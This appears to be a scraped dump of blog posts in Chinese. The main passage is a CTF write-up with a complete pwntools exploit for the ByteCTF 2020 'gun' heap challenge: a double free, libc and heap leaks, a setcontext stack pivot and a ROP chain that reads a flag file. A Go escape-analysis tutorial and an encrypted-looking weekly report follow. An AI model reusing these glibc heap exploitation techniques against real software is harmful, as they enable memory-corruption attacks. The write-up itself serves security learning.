相关利用的时候要先填满对应的 tcache_entry 链。\nsmallbin\ntcache 与 smallbin 之间也增加了 stash 的过程，即向 smallbin 申请的时候，这条 smallbin 链中其余 chunk 会被放到对应 size 的 tcache_entry 链中。\nsize_t tc_idx = csize2tidx (nb);if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)&#123;    mchunkptr tc_victim;/* While bin not empty and tcache not full, copy chunks over.  */    while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count           &amp;&amp; (tc_victim = last (bin)) != bin)    &#123;        if (tc_victim != 0)        &#123;            bck = tc_victim-&gt;bk;            set_inuse_bit_at_offset (tc_victim, nb);            if (av != &amp;main_arena)                set_non_main_arena (tc_victim);            bin-&gt;bk = bck;            bck-&gt;fd = bin;            tcache_put (tc_victim, tc_idx);        &#125;    &#125;&#125;\n\nTache stash unlink \n这种 smallbin 解链方式类似于远古版本的无检测 unlink ，就此也产生了新的利用方式，目前适用于所有带 tcache 的 glibc 版本。\n攻击的前提就是得到堆地址，且可以修改 smallbin 中 chunk 的 bk 字段，这里针对不同情况，可以实现三种效果：\nTcache stash unlink attack\n该利用方式在祥云杯初赛就遇到过，需要利用该方式将某random key值修改为指定值，类似与unsorted bin 攻击，即向任意地址写入一个不可控的大数字。其最核心操作，就是先放入 2 个 chunk 到 smallbin，6 个 chunk 到对应的 tcache 。之后在不破坏 fd 的情况下将后放入 smallbin 的 chunk 的 bk 设置为目标地址-  0x10 。这样当再向 smallbin 申请对应 size 的 chunk 时（一般用 calloc，因为 calloc 不从tcache分配内存 ），先放入 smallbin 的 chunk 被分配给用户，然后触发 stash 机制。bck &#x3D; tc_victim-&gt;bk; 此时的 bck 就是目标地址-0x10，之后  bck-&gt;fd &#x3D; bin; 也就是*(目标地址-0x10+0x10) &#x3D;  bin，这样就实现了等价于 unsortedbin 的操作。之后调用 tcache_put 把后放入 smallbin 的 chunk  取出给对应的 tcache ，因为 tcache 之前已经被布置了 6 个 chunk ，这次 put 后达到了阈值，所以也就退出了这次  stash 循环，整个流程就可以正常结束了。\nglibc 2.29与gilbc 2.31其实利用差不多的，保护检查机制没有增加。\nLIBC-2.31利用例子BYTECTF-2020-GUN下载: \n简单描述该题是一个libc-2.31的利用, 且开启了沙箱, 只能orw\nvul__int64 __usercall shoot@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;)&#123;  __int64 v2; // rsi  __int64 v3; // rdi  __int64 v4; // ST08_8  signed int i; // [rsp-18h] [rbp-18h]  __int64 idx; // [rsp-14h] [rbp-14h]  __int64 v7; // [rsp-8h] [rbp-8h]  __asm &#123; endbr64 &#125;  v7 = a1;  if ( !loaded_arr ) // 检查是否存在bullet, 然而在释放完毕后也没有对loaded_arr进行清0    return puts_0(&quot;No bullet!&quot;);  sub_1140();  idx = (unsigned int)input_n((__int64)&amp;v7);  for ( i = 0; loaded_arr &amp;&amp; i &lt; (signed int)idx; ++i )  &#123;    v2 = *(_QWORD *)loaded_arr;    sub_1140();    v3 = *(_QWORD *)loaded_arr;    sub_1100();    v4 = loaded_arr;    loaded_arr = *(_QWORD *)(loaded_arr + 8);   // vul: not set loaded_arr as null, just move next ptr to this    *(_QWORD *)(v4 + 16) = 0LL;  &#125;  sub_159A();  return sub_1140();&#125;__int64 __usercall load@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;)&#123;  unsigned __int64 v2; // [rsp-10h] [rbp-10h]  __int64 v3; // [rsp-8h] [rbp-8h]  __asm &#123; endbr64 &#125;  v3 = a1;  sub_1140();  v2 = input_n((__int64)&amp;v3);  if ( v2 &gt; 0xD || ptr_arr_flag[3 * v2] == 0LL || ptr_arr_flag[3 * v2] == 2LL )    return puts_0(&quot;what??&quot;);  if ( loaded_arr ) // vul, 不为0时, 直接    *((_QWORD *)&amp;unk_4068 + 3 * v2) = loaded_arr;  loaded_arr = (__int64)&amp;unk_4060 + 0x18 * v2;  *((_QWORD *)&amp;unk_4060 + 3 * v2 + 2) = 2LL;  return puts_0(&quot;Confirm.&quot;);&#125;\n\n在进行shoot的时候, 只是对loaded_arr设置为下一个数据指针, 并没有清0, 若下一个数据指针已经被释放, 即可造成double free\ndouble free poc\nli(&#x27;exploit...&#x27;)sla(&#x27;:&#x27;, &#x27;I0gan&#x27;)buy(0x10, &#x27;E&#x27; * 8 + &#x27;\\n&#x27;) # 0buy(0x10, &#x27;F&#x27; * 8 + &#x27;\\n&#x27;) # 1load(1)load(0)shoot(2)buy(0x10, &#x27;G&#x27; * 8 + &#x27;\\n&#x27;) # 1load(0)shoot(2)\n\n先泄漏libc\nli(&#x27;exploit...&#x27;)# leak libcsla(&#x27;:&#x27;, &#x27;I0gan&#x27;)buy(0x450, &#x27;X&#x27; * 0x10 + &#x27;\\n&#x27;) # 0buy(0x10, &#x27;A&#x27; * 8 + &#x27;\\n&#x27;) # 1load(0)shoot(1)buy(0x10, &#x27;X&#x27; * 8 +&#x27;\\n&#x27;); # 0load(0)shoot(1)libc_base = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;) - 0x1ebf80 - 96li(&#x27;libc_base :&#x27; + hex(libc_base))# releaseload(1)shoot(1)\n\n那么现在要如何实现堆重叠, 然而在程序逻辑中, 加载后的子弹不会清0, 残余的数据指针仍然还在, 那么若我们能够伪造一个chunk, 释放该chunk, 修改释放后的chunk的fd, 即可实现任意地址写入\n实现heap overlap\n# set heap chunk overlapn = 9for _ in range(n):\tbuy(0x80, &#x27;A&#x27; + str(_) + &#x27;\\n&#x27;)for i in range(n):\tload(n - i - 1)shoot(n)p = p64(0) * 0x10p += p64(0) + p64(0x31) # fake chunk, because chunk overlap, then we can control itp += p64(0) * 5 + p64(0x21) + b&#x27;\\n&#x27;buy(0x410, p) # 0buy(0x20, &#x27;20: 0\\n&#x27;) # 1for i in range(6):\tbuy(0x10, &#x27;10: &#x27; + str(i) + &#x27;\\n&#x27;) # 2 ~ 8load(7)load(1) # 1shoot(3)\n\n\n\n泄漏heap且释放我们overlap的大chunk, 以实现我们可以控制伪造chunk的fd\n# leak heap baseload(0)shoot(1)buy(0x20, &#x27;\\n&#x27;) # 0load(0)shoot(1)ru(&#x27;The &#x27;)leak = u64(r(6) + b&#x27;\\x00\\x00&#x27;)heap_base = leak - (0x55962cf186e0 - 0x55962cf18000 )li(&#x27;heap base&#x27; + hex(heap_base))\n\n\n\n堆栈迁移至heap中并且打rop\n# stack move to heap and rop\tlibc.address = libc_base\tsetcontext = libc.sym[&#x27;setcontext&#x27;] + 0x3d\tfree_hook  = libc.sym[&#x27;__free_hook&#x27;]\trdx_and_call = libc_base + 0x1547a0\tpop_rax = libc_base + 0x4a550\tpop_rdi = libc_base + 0x26b72\tpop_rsi = libc_base + 0x27529\tpop_rdx_r12 = libc_base + 0x11c1e1\tret = libc_base + 0x25679\tsyscall = libc_base + 0x2584d\tp = p64(0)\tp += p64(heap_base + 0x750 + 0x10) # set rdx\tp += p64(0) * 4\tp += p64(setcontext) # call [rdx + 0x20]\tp += b&#x27;./flag\\x00\\x00&#x27; # heap_base + 0x750 + 0x38 = 0x788\tp = p.ljust(0x80, b&#x27;\\x00&#x27;) # rdx + 0x90\tp += p64(0)         # prev_size\tp += p64(0x31)      # size\tp += p64(free_hook) # fd\tp += p64(0) * 3\tp += p64(heap_base + 0x750 + 0x100) # mov rsp, [rdx + 0xa0]\tp += p64(ret) # avoid push rcx\tp = p.ljust(0x100, b&#x27;\\x00&#x27;)\tflag_addr = heap_base + 0x788\t# open\t\trop_open = flat([\tpop_rdi , flag_addr,\tpop_rsi , 0,\tlibc.sym[&#x27;open&#x27;]\t])\trop_read = flat([\tpop_rdi, 3,\tpop_rsi, flag_addr,\tpop_rdx_r12, 0x100, 0,\tlibc.sym[&#x27;read&#x27;]\t])\trop_puts = flat([\tpop_rdi, flag_addr,\tlibc.sym[&#x27;puts&#x27;]\t])\trop = rop_open\trop += rop_read\trop += rop_puts\tp += rop\tp += b&#x27;\\n&#x27;\tbuy(0x1c0, p) # 0\tli(&#x27;setcontext: &#x27; + hex(setcontext))\tbuy(0x20, &#x27;\\n&#x27;) # for ajust  1\tbuy(0x20, p64(rdx_and_call) + b&#x27;\\n&#x27;) # 2\tload(0)\t#db()\tshoot(1)\n\n以上堆栈迁移与rop是同一个payload进行的, 需要精心计算, 还有一个坑就是在setcontext中有个判断, 失败的话就执行push rcx, 而rcx 为[rdx + 0xa8], 则在[rdx + 0xa8]处需要添加一个ret指令的地址,这样才能连接到我们精心构造的rop\nexp#!/usr/bin/env python3#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;elf_path  = &#x27;gun&#x27;#libc_path = &#x27;./libc.so.6&#x27;libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;# remote server ip and portserver_ip = &quot;0.0.0.0&quot;server_port = 0# if local debugLOCAL = 1LIBC = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def shoot(t):\tsla(&#x27;&gt;&#x27;, &#x27;1&#x27;)\tsla(&#x27;:&#x27;, str(t))def load(n):\tsla(&#x27;&gt;&#x27;, &#x27;2&#x27;)\tsla(&#x27;?&#x27;, str(n))def buy(n, d):\tsla(&#x27;&gt;&#x27;, &#x27;3&#x27;)\tsla(&#x27;:&#x27;, str(n))\tsa(&#x27;:&#x27;, d)def quit():\tsla(&#x27;&gt;&#x27;, &#x27;4&#x27;)\t\t#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\t# leak libc\tsla(&#x27;:&#x27;, &#x27;I0gan&#x27;)\tbuy(0x450, &#x27;X&#x27; * 0x10 + &#x27;\\n&#x27;) # 0\tbuy(0x10, &#x27;A&#x27; * 8 + &#x27;\\n&#x27;) # 1\tload(0)\tshoot(1)\tbuy(0x10, &#x27;X&#x27; * 8 +&#x27;\\n&#x27;); # 0\tload(0)\tshoot(1)\tlibc_base = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;) - 0x1ebf80 - 96\tli(&#x27;libc_base :&#x27; + hex(libc_base))\t# release\tload(1)\tshoot(1)\t# leak heap base\tn = 9\tfor _ in range(n):\t\tbuy(0x80, &#x27;A&#x27; + str(_) + &#x27;\\n&#x27;)\tfor i in range(n):\t\tload(n - i - 1)\tshoot(n)\tp = p64(0) * 0x10\tp += p64(0) + p64(0x31)\tp += p64(0) * 5 + p64(0x21) + b&#x27;\\n&#x27;\tbuy(0x410, p) # 0\tbuy(0x20, &#x27;a\\n&#x27;) # 1\tfor i in range(6):\t\tbuy(0x10, &#x27;A\\n&#x27;) # 1 ~ 7\tload(7)\tload(1) # 1\tshoot(3)\tload(0)\tshoot(1)\tbuy(0x20, &#x27;\\n&#x27;) # 0\tload(0)\tshoot(1)\tru(&#x27;The &#x27;)\tleak = u64(r(6) + b&#x27;\\x00\\x00&#x27;)\theap_base = leak - (0x55962cf186e0 - 0x55962cf18000 )\tli(&#x27;heap base&#x27; + hex(heap_base))\t\tlibc.address = libc_base\tsetcontext = libc.sym[&#x27;setcontext&#x27;] + 0x3d\tfree_hook  = libc.sym[&#x27;__free_hook&#x27;]\trdx_and_call = libc_base + 0x1547a0\tpop_rax = libc_base + 0x4a550\tpop_rdi = libc_base + 0x26b72\tpop_rsi = libc_base + 0x27529\tpop_rdx_r12 = libc_base + 0x11c1e1\tret = libc_base + 0x25679\tsyscall = libc_base + 0x2584d\tp = p64(0)\tp += p64(heap_base + 0x750 + 0x10) # set rdx\tp += p64(0) * 4\tp += p64(setcontext) # call [rdx + 0x20]\tp += b&#x27;./flag\\x00\\x00&#x27; # heap_base + 0x750 + 0x38 = 0x788\tp = p.ljust(0x80, b&#x27;\\x00&#x27;) # rdx + 0x90\tp += p64(0)         # prev_size\tp += p64(0x31)      # size\tp += p64(free_hook) # fd\tp += p64(0) * 3\tp += p64(heap_base + 0x750 + 0x100) # mov rsp, [rdx + 0xa0]\tp += p64(ret) # avoid push rcx\tp = p.ljust(0x100, b&#x27;\\x00&#x27;)\tflag_addr = heap_base + 0x788\t# open\t\trop_open = flat([\tpop_rdi , flag_addr,\tpop_rsi , 0,\tlibc.sym[&#x27;open&#x27;]\t])\trop_read = flat([\tpop_rdi, 3,\tpop_rsi, flag_addr,\tpop_rdx_r12, 0x100, 0,\tlibc.sym[&#x27;read&#x27;]\t])\trop_puts = flat([\tpop_rdi, flag_addr,\tlibc.sym[&#x27;puts&#x27;]\t])\trop = rop_open\trop += rop_read\trop += rop_puts\tp += rop\tp += b&#x27;\\n&#x27;\tbuy(0x1c0, p) # 0\tli(&#x27;setcontext: &#x27; + hex(setcontext))\tbuy(0x20, &#x27;\\n&#x27;) # for ajust  1\tbuy(0x20, p64(rdx_and_call) + b&#x27;\\n&#x27;) # 2\tload(0)\t#db()\tshoot(1)&#x27;&#x27;&#x27;.text:00000000001547A0                 mov     rdx, [rdi+8].text:00000000001547A4                 mov     [rsp+0C8h+var_C8], rax.text:00000000001547A8                 call    qword ptr [rdx+20h].text:00000000001547AB                 mov     qword ptr [rbx], 0.text:00000000001547B2                 mov     rax, [rsp+0C8h+var_C8]&#x27;&#x27;&#x27;#setcontext# # 0x7f6c8f6f21c6 &lt;setcontext+294&gt;    mov    rcx, qword ptr [rdx + 0xa8]# push rcx&#x27;&#x27;&#x27;.text:00000000000580DD                 mov     rsp, [rdx+0A0h].text:00000000000580E4                 mov     rbx, [rdx+80h].text:00000000000580EB                 mov     rbp, [rdx+78h].text:00000000000580EF                 mov     r12, [rdx+48h].text:00000000000580F3                 mov     r13, [rdx+50h].text:00000000000580F7                 mov     r14, [rdx+58h].text:00000000000580FB                 mov     r15, [rdx+60h].text:00000000000580FF                 test    dword ptr fs:48h, 2.text:000000000005810B                 jz      loc_581C6.text:0000000000058111                 mov     rsi, [rdx+3A8h].text:0000000000058118                 mov     rdi, rsi.text:000000000005811B                 mov     rcx, [rdx+3B0h]&#x27;&#x27;&#x27;\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process()\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n\n\n\n\n\n\n其他姿势应付orw打入堆栈中泄漏libc中的environ, 该变量中储存的是stack中的环境变量地址,这个可以泄漏堆栈地址, 从而可以打入堆栈中进行rop\n堆栈迁移至堆采用setcontext函数进行设置rsp, 然而再设置rsp的时候是根据rdx寄存器来进行设定的, 而平时在堆中, 若我们可以控制一个rdi, 找到一个rdx与rdi的对应关系, 我们就可以间接的修改rsp,在进行ret的时候就可以达到rop\n找一个跳板\nmov    rdx, qword ptr [rdi + 8]mov    qword ptr [rsp], raxcall   qword ptr [rdx + 0x20] &lt;setcontext+61&gt;\n\n找到setcontext函数 + 61处\nmov     rsp, [rdx+0A0h]mov     rbx, [rdx+80h]mov     rbp, [rdx+78h]mov     r12, [rdx+48h]mov     r13, [rdx+50h]mov     r14, [rdx+58h]mov     r15, [rdx+60h]test    dword ptr fs:48h, 2jz      loc_581C6mov     rsi, [rdx+3A8h]mov     rdi, rsimov     rcx, [rdx+3B0h]\n\n\n\n快速查找指令objdump -M intel -D libc.so.6 | grep &quot;mov    rdx,QWORD PTR \\[rdi+0x8\\]&quot;\n\n\n\n\n\n参考\nhttps://zhuanlan.zhihu.com/p/136983333\nhttps://www.anquanke.com/post/id/194960\nhttp://blog.eonew.cn/archives/1167\n","categories":["ctf"],"tags":["pwn"]},{"title":"Go逃逸分析","url":"/2020/10/25/dev/language/go/golang-escape-analysis/","content":"Golang 逃逸学习golang的内存管理比较安全，不可直接操作内存，且在编译期间会进行数组越界检查，在运行的时候直接报错。\n这篇文章就记录一下golang逃逸的一些相关原理吧。\ngolang逃逸分析wikiIn compiler optimization, escape analysis is a method for determining the dynamic scope of pointers - where in the program a pointer can be accessed. It is related to pointer analysis and shape analysis.\nWhen a variable (or an object) is allocated in a subroutine, a pointer to the variable can escape to other threads of execution, or to calling subroutines. If an implementation uses tail call optimization (usually required for functional languages), objects may also be seen as escaping to called subroutines. If a language supports first-class continuations (as do Scheme and Standard ML of New Jersey), portions of the call stack may also escape.\nIf a subroutine allocates an object and returns a pointer to it, the object can be accessed from undetermined places in the program — the pointer has “escaped”. Pointers can also escape if they are stored in global variables or other data structures that, in turn, escape the current procedure.\nEscape analysis determines all the places where a pointer can be stored and whether the lifetime of the pointer can be proven to be restricted only to the current procedure and&#x2F;or thread\n逃逸分析优势1 最大的好处应该是减少gc的压力，不逃逸的对象分配在栈上，当函数返回时就回收了资源，不需要gc标记清除。\n2 因为逃逸分析完后可以确定哪些变量可以分配在栈上，栈的分配比堆快，性能好\n3 同步消除，如果你定义的对象的方法上有同步锁，但在运行时，却只有一个线程在访问，此时逃逸分析后的机器码，会去掉同步锁运行。\ngo与c&#x2F;c++编译的程序区别c&#x2F;c++编译的程序，堆栈空间给的比较少，一般做大型项目的时候，数据量大了就把数据放在堆里储存，而go呢，内存机制有自己本身管理，采用堆栈迁移的方式把堆栈迁移到所开辟出来空间比较大的地方，所以golang 在运行完大多数对象都可以放在堆栈中。下面来跟踪一下golang程序的运行\npackage mainfunc hack() &#123;    fake_flag := []int64&#123;0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0&#125;\tvar p []int64\tp = fake_flag\tp[1] = 2;&#125;func main() &#123;    flag := []int64&#123;0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0&#125;    for i, v := range flag &#123;        flag[i] = v + 1    &#125;    hack()&#125;\n\n以上编译为elf文件后是gdb进行调试\nmain_mian的地址为0x45DA40\n程序刚开始运行时的堆栈就为操作系统所给的堆栈空间\n RSP  0x7fffffffdf30 ◂— 0x1  RIP  0x45b9e0 (_rt0_amd64_linux) ◂— jmp   0x458580下断点到main_main函数 RBP  0xc00003e7d0 ◂— 0x0  RSP  0xc00003e780 —▸ 0x42fb29 (runtime.main+521) ◂— mov   eax, dword ptr [rip + 0xcbbf5]  RIP  0x45da40 (main.main) ◂— mov   rcx, qword ptr fs:[0xfffffffffffffff8]\n\n\n\n\n\n可以看到以上,rsp与rbp已经不再是0x7f开头的地址了而是进行了堆栈迁移\npwndbg&gt; vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA          0x400000           0x45e000 r-xp    5e000 0      /home/logan/share/bytectf/leak/leak          0x45e000           0x4c8000 r--p    6a000 5e000  /home/logan/share/bytectf/leak/leak          0x4c8000           0x4cc000 rw-p     4000 c8000  /home/logan/share/bytectf/leak/leak          0x4cc000           0x4fe000 rw-p    32000 0      [heap]      0xc000000000       0xc004000000 rw-p  4000000 0          0x7fffd1328000     0x7fffd3699000 rw-p  2371000 0          0x7fffd3699000     0x7fffe3819000 ---p 10180000 0          0x7fffe3819000     0x7fffe381a000 rw-p     1000 0          0x7fffe381a000     0x7ffff56c9000 ---p 11eaf000 0          0x7ffff56c9000     0x7ffff56ca000 rw-p     1000 0          0x7ffff56ca000     0x7ffff7a9f000 ---p  23d5000 0          0x7ffff7a9f000     0x7ffff7aa0000 rw-p     1000 0          0x7ffff7aa0000     0x7ffff7f19000 ---p   479000 0          0x7ffff7f19000     0x7ffff7f1a000 rw-p     1000 0          0x7ffff7f1a000     0x7ffff7f99000 ---p    7f000 0          0x7ffff7f99000     0x7ffff7ff9000 rw-p    60000 0          0x7ffff7ff9000     0x7ffff7ffd000 r--p     4000 0      [vvar]    0x7ffff7ffd000     0x7ffff7fff000 r-xp     2000 0      [vdso]    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]\n\n可以发现新的堆栈空间大小为0x4000000, 而操作系统所给的为0x21000, 所以golang的变量大部分都会优先储存在堆栈上，因为堆栈空间比较大，且内存管理比较简单。\ngo的逃逸分析go在动态编译的时候进行逃逸分析，来决定一个对象放栈上还是放堆上，不逃逸的对象放栈上，可能逃逸的放堆上。\n开启逃逸分析日志在编译的时候参数加上-gcflags &#39;-m&#39;,为了不产生inline函数，一般都会加上-l\n也就是 -gcflags &#39;-m -l&#39;\nExample 1package mainimport &quot;fmt&quot;func main() &#123;        s := &quot;Hello World&quot;        fmt.Println(s)&#125;\n\n逃逸分析\n┌[logan☮arch]-(~/share/bytectf/leak)└&gt; go run -gcflags &#x27;-m -l&#x27; 1.go# command-line-arguments./1.go:6:13: ... argument does not escape./1.go:6:13: s escapes to heapHello World\n\n\n\nExample 2package maintype S struct&#123;&#125;func main() &#123;    var x S    y := &amp;x    _ = *identity(y)&#125;func identity(z *S) *S &#123;    return z&#125;\n\n输出\n┌[logan☮arch]-(~/share/bytectf/leak)└&gt; go run -gcflags &#x27;-m -l&#x27; 2.go# command-line-arguments./2.go:11:15: leaking param: z to result ~r1 level=0\n\nx没有被引用，没有发生逃逸\nExample 3package maintype S struct&#123;&#125;func main() &#123;    var x S    _ = *ref(x)&#125;func ref(z S) *S &#123;    return &amp;z&#125;\n\n输出\n┌[logan☮arch]-(~/share/bytectf/leak)└&gt; go run -gcflags &#x27;-m -l&#x27; 3.go             # command-line-arguments./3.go:10:10: moved to heap: z\n\ngo进行值传递，而在调用ref后进行引用，避免内存错误，则会将z放在heap上。\nExample 4package maintype S struct &#123;     M *int&#125;func main() &#123;     var i int     refStruct(i)&#125;func refStruct(y int) (z S) &#123;    z.M = &amp;y    return z &#125;\n\n输出\n┌[logan☮arch]-(~/share/bytectf/leak)└&gt; go run -gcflags &#x27;-m -l&#x27; 4.go# command-line-arguments./4.go:12:16: moved to heap: y\n\n对y进行了值引用，则使y放在heap上\nExample 5package maintype S struct &#123;     M *int&#125;func main() &#123;     var i int     refStruct(&amp;i)&#125;func refStruct(y *int) (z S) &#123;    z.M = y    return z &#125;\n\n输出\n┌[logan☮arch]-(~/share/bytectf/leak)└&gt; go run -gcflags &#x27;-m -l&#x27; 5.go# command-line-arguments./5.go:12:16: leaking param: y to result z level=0\n\n对原先堆栈里的数据进行引用，没有发生逃逸\nExample 6package maintype S struct &#123;     M *int&#125;func main() &#123;     var x S    var i int    ref(&amp;i, &amp;x) &#125;func ref(y *int, z *S) &#123;     z.M = y&#125;\n\n输出\n┌[logan☮arch]-(~/share/bytectf/leak)└&gt; go run -gcflags &#x27;-m -l&#x27; 6.go# command-line-arguments./6.go:13:10: leaking param: y./6.go:13:18: z does not escape./6.go:9:9: moved to heap: i\n\nz没有逃逸，有两个指针指向i变量，而i逃逸了，go的逃逸分析不知道z和i的关系，逃逸分析不知道参数y是z的一个成员，所以只能把i分配给堆管理\n总结以上是golang编译器通过分析代码会在编译时觉得哪些变量该分配在stack中，哪些变量该分配在heap中。\nref: https://www.bookstack.cn/read/For-learning-Go-Tutorial/src-chapter13-01.0.md\n","categories":["language"],"tags":["go"]},{"title":"2020-10-25 周报","url":"/2020/10/25/life/weekly/2020-10-25-%E5%91%A8%E6%8A%A5/","content":"\n  69d01b89b9601e5c57b37cfc1411681a1f21976d1d4b0aa15d31e1e10e33897712c9a851414f4f9d3231671cac7f69b3443c647e87d7fc604891fe27b023aa697d97552b6fab1837a525e9c6a46599a42558dcb95d367ce103c8d35af0390a56716f5a5b51fff1d4fd97eef742b8db37ebacbc53d8ca55f62d9e78c099ec7a47231e0a54fba5de8b749f28fb857965a61f37b50605a53bdf6f4c58ec6fd17a9ff2f366c3927c3ea883a514719930aebcdaf393c4edf89b5bed91ac787ca980fc9e3530c3b35b8eb8aca2baa1d5ca1dd05f6e0268741fa629831ae4490bda1927af4992e9b41ab53fa7203c4ac651d716dda6fbb702e91d96b54b1ecf9ffa6c205509a2248e8f07a2d0b85ef7bd4efc2bb307b6d82ed3752deac04283792e1efc22306593ddd7c48a659e7b478354b9190db5c1ad953f35865658f2913e3f0fdbb4a6464320681cfa44a0e219c0a218840d8662595cd172fceaed317fd45903b266b110fa136313868dfcd0c224af6a477ff448454c30454c5b3a7de3d7e1b615078be794e6027f5dfdfbf98417ab4555b61f5f210f7cff739500b86e195e1f03686f09c0bf6e4f4c2382e1bf4ad0124aa7f08c598d1ae131d7ff5facedfd01549ceff0a784b596af98a38720aab87bd6ea4802dcd4cc46b1763fbb38d8a92fdf2e484d5dc94d53b4e6e8c046fcdedcba3944e8b3265a66a5154fb196ea4cb7234cd2d00729b3a4d9c61a0a1bf18836d8b674afd53c7b6f6b118f0e8b0c58d5bb4a77ed72c1be0d88e7ba633033e97172c3cfc2ba7145cb8e5fc905db71504360614c6d963a578be7febe9c4281146ec1de35c237e3eb961902729351b459ae10d105757580e867461fbfba2c54940e3b4e6affa82fe3c4760e50dc2fe70d8a1104577b2ab5e90116b75eb876849580c848d74f25a2d913a8b07ab532316fef359945d0348e6f27fda465b41a8fb30cf7cb6677ffadaf4f86a836a210986f27bbac94dfcf0a25f082303cef704955fb49f0a43100cf950f102aab7a294a3e291a4be93dc6840ef85109e7ad86a6fc0358a06ccc94a1b9900eb65faf534c99fc77eb95bacc8428d595d8f0a4c25d73e2d3699b60563d85fcb1a959e18a3b41d4d09c4ae6179519586409f4ba00e546e17021a395298c3666143a54d82fe49b203d21655baa106a01dcdbd3233e018e7a895fb338848ccfed39554564b15aa4974b60c290f3738730e9ae331d3773f9eb161d9c6166c44723cf49be9dae27fe1dbe866d32b5d9bdf98cd12c4929314c626bc950b42886baf32312737b797d8763fae85a7ed028abe694efabedf35a73f4fa07ba6b17cbf1b0daabfe87e80df89bb6c481de6dfb5365db61e99b5d922ac911e65df54da5f1056b034ad4f50b6733460568b27847d4a49b3221362f97d05a0dc1206bbfabcf08de3cf28fe4ebb7d48f87aa1468ce0f9e42f930c7fe26560d740022583298161eb500a1b3364510c028f1dffc347ddfb2ee59de5282c38b9bcdd8a9e659605a0fe2f219f74a083c5c393222e5a79b31ed8d8cdb2295722db18d96884867bab964309f3b5ba7abe2812216ae7f35b66bcad4a47e35fac12f29d67323be1d85539ebdd776675d686e0e3c3a7c1bce5bf1fe432896dddc3ee37474516f436b206e336af6369ba9ff1402e792321f5295833f0be4658e1a7884d0347a2f3bcacfdcd6b98703daf689cf7c3a78ff3b9cc6ed63a03b5ed2a142cf6216a5f3103439673824412952941ce8fa2159367a78ad7f49751680e6dd83b11ad3759d8fad098cfc76d645a576b248af8390d546c5538f81a76d1ac49defb7160b33fc7809f3a82294a3d9842014b2749d00b6ff2d19459257af4e76306a2d0ed4682be58a8e714b71eb06ce3a666022531084044f0ed0283609a0ec30a0408cc17c8191e85cf48fe8d069bdff23d63a5ea282a2ebeec2d5a4f0ebbb18dcacf7e089b29d75540e1e27623f12b0a2992a5876a55e47701f73d7ce1612adfbd3f5ae14cc8ca4fad051ac2ddac493932b06de6953e5aa3e6c970e45ab35b611d86bc94478c2b50f26b496ae34cba9e7adea975aac36ab9d0b179edf3425c0f8a58527c3c3120614799c85806b3e1e3a90b545c6108184932298774ceeeafd8fbee56f4d269b33033f730397ac1306e0307f88a01dc9dff440a3eebdb92a87e5a8a8137b70e4a45df17c4721807c2a5840c4e15c60c09966ac31271b4393a7ad9e4cf37fc2308d8b0db450c27cf088ac28f4aa5df218323efc5d2ccbeffa402af59b0aa57920382db34722528d704131028b3a9b9db48177f117d43ecab81f0ca3e40512818daa5fd47a2cd43641a07927dd275ebb3c4f7403885b998a2bd154c8ad49564921789cd581bf6747a863142abdb9dd05fee0330e17916d493e9074c4332a988d3065295c42669385fd101aa24f307bb7ce52fc442847f4d4e6a7947a9b95c1d2baeea5d26f79a1ee7703354148d83e3155b885e87c3ee3f0ad85d336656933ee379d9fbe5d12feacabd4df9a5d81bda2c279a3bcb758de310d74d7df5e1ef80838d37a69692b370439518bb3894e65fb7769d57c48f0651e111eb38a531a9bcadcce28f4ea95352b6ccd18eae8926e452af4c503e34c144ee79753146da63b46d4522fc928fdfe93cdf6a1d4bf9908169d5509d4396c738660e03601dcbd091b6117f24247e201750232c76319c1ff0c0ebbb571e621d7a4e7507f53c6f546e55a962214c3ff7950221e624b61775644317fa413d80729d6557f9521350a0f9febb766c5187c7789369f7005052ea8f59106810806d2aa18aefd32c64a7d2b7797dc143ec48f4104506b1d7fb508b117474e9c023fd3f97af6a67b1e4e33de24a1a63bd99e86a519626c10666ebdb335e5259769e7a145431edcb92a5d5492344d9d07da8eecf85dd314193ddd4a143e05ac29cbfd107eb8ccc153a89a03304fb620f7f918463a52a0a0d35d0f8d73543120df463435afac32d7df1b80f